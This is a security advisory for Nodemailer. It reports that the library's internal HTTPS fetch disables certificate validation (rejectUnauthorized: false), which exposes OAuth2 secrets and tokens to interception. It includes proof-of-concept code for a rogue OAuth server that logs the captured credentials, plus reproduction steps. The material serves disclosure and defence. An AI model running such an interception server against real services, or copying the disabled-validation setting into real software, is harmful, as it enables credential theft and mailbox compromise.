# [M] Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception

## Summary
Severity: Medium
Advisory: GHSA-r7g4-qg5f-qqm2
CWE: CWE-295
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-r7g4-qg5f-qqm2
Type: github-advisory

## Affected
- npm: `nodemailer` — affected >=0 <8.0.8

## Details
### Summary
Nodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.

As a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.

An attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:

- OAuth client_secret
- refresh_token
- access tokens

The issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.

### Details
Root Cause

The issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.

Inside:

`lib/fetch/index.js`

the request options contain:

`rejectUnauthorized: false`

This disables TLS peer certificate verification globally for the internal HTTPS client unless explicitly overridden through optional TLS configuration.

As a result:

- self-signed certificates are trusted
- invalid CA chains are accepted
- hostname validation is bypassed
- attacker-controlled HTTPS endpoints are treated as trusted

This violates expected HTTPS security guarantees.

**Vulnerable Flow**

The vulnerable execution chain is:

OAuth2 Transport
        ↓
XOAuth2 token generation
        ↓
Internal HTTPS fetch client
        ↓
HTTPS request with rejectUnauthorized:false
        ↓
Attacker-controlled/self-signed endpoint trusted
        ↓
OAuth credentials **transmitted**


### PoC
**Environment**
#### Mail API (app/server.js)
```
const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

app.use(express.json());

const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: false,
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

app.post("/send", async (req, res) => {
    try {
        const { to, subject, text, html } = req.body;

        const info = await transporter.sendMail({
            from: `"Mailer" <${process.env.SMTP_USER}>`,
            to,
            subject,
            text,
            html
        });

        res.json({
            success: true,
            messageId: info.messageId
        });

    } catch (err) {
        console.error(err);
        res.status(500).json({
            success: false,
            error: err.message
        });
    }
});

app.listen(process.env.PORT, () => {
    console.log(`Mailer running on port ${process.env.PORT}`);
});
```

#### Malicious HTTPS OAuth Server (poc/evil-oauth.js)

```
const https = require('https');
const fs = require('fs');

https.createServer({
    key: fs.readFileSync('./key.pem'),
    cert: fs.readFileSync('./cert.pem')
}, (req, res) => {

    console.log('\n==== REQUEST INTERCEPTED ====');
    console.log(req.method, req.url);

    let body = '';

    req.on('data', chunk => {
        body += chunk;
    });

    req.on('end', () => {

        console.log('\nPOST BODY:');
        console.log(body);

        res.writeHead(200, {
            'Content-Type': 'application/json'
        });

        res.end(JSON.stringify({
            access_token: 'attacker_token',
            expires_in: 3600
        }));
    });

}).listen(8443, () => {
    console.log('Malicious HTTPS OAuth server listening on 8443');
});
```

#### Nodemailer OAuth2 Test (test.js)

```
const nodemailer = require('./');

const transporter = nodemailer.createTransport({
    service: 'gmail',

    auth: {
        type: 'OAuth2',

        user: 'redacted@example.com',

        clientId: 'CLIENT_ID_REDACTED',
        clientSecret: 'CLIENT_SECRET_REDACTED',

        refreshToken: 'REFRESH_TOKEN_REDACTED',

        accessUrl: 'https://localhost:8443/token'
    }
});

transporter.sendMail({
    from: 'redacted@example.com',
    to: 'redacted@example.com',
    subject: 'PoC',
    text: 'test'

}, (err, info) => {

    console.log('\n==== NODEMAILER RESULT ====');

    if (err) {
        console.error(err);
    } else {
        console.log(info);
    }
});
```
**Steps to Reproduce**

- Start malicious HTTPS OAuth server:
- node poc/evil-oauth.js
- Run Nodemailer OAuth2 test:
- node test.js
- Observe intercepted OAuth2 request body on the malicious HTTPS server.

**PIC**
<img width="1919" height="1029" alt="image" src="https://github.com/user-attachments/assets/fdeafeb4-c0c5-49f8-beeb-e7f945be0516" />

### Impact

- OAuth credential theft
- unauthorized email access
- persistent token abuse
- unauthorized mail sending
- mailbox compromise
- interception/tampering of OAuth responses

The issue effectively downgrades HTTPS security protections for sensitive OAuth credential exchanges.

## References
- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2
- https://github.com/nodemailer/nodemailer
